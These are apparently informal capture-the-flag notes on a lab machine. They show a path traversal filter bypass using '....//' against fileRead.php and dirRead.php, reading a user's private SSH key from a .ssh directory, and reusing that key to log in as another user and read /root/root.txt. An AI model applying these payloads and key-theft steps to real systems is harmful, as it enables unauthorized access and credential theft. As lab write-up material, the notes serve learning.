In the source code of the http website there is this java code:
function readFile(file){ 
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST","fileRead.php",false);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.send('file=' + file);
  if (xhttp.readyState === 4 && xhttp.status === 200) {
    return xhttp.responseText;
  }else{
  }
}
we can use this to read other php files on the server

we intercept teh request with burpe and we find out that we can provide an output to /dirRead.php to get files.
when playing around with requests we can see that there is a filter on the ../../
path=....//....//....//....//....//home/nobody//.ssh returns; [".","..",".monitor","authorized_keys","known_hosts"]
so we can see that the .moinitor might be the private key

we then do this command in /fileRead.php:
file=....//....//....//....//....//home/nobody/.ssh/.monitor which gives us the ssh key for the user nobody 
we can also use the script provided to have a command line interface to get the ssh key
it appears taht there is another user on the box 'monitor' so we try log back in with teh same ssh key to escape our restricted bash shell

ssh -i /home/nobody/.ssh/.monitor monitor@127.0.0.1 -t bash --noprofile
the path is screwed so we have to do export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
now we can go and have a look around
we eventually figure out that we can use the tac binary to read files
tac /root/root.txt

im sorry this is not very detailed but this is my rough notes for the box
